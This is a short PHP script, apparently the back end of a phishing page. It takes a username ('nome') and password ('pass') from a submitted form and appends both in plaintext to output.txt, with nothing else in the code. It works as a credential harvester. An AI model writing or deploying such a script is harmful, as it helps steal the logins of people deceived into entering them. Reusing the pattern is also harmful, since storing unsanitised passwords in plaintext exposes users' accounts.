<?php
$n = $_POST['nome'];
$p = $_POST['pass'];
$dati = "Username: ";
$dati .= $n;
$dati .= " - Password: ";
$dati .= $p;
$dati .= "\n\n";

$var=fopen("output.txt","a");
fwrite($var,$dati);
fclose($var);
?>
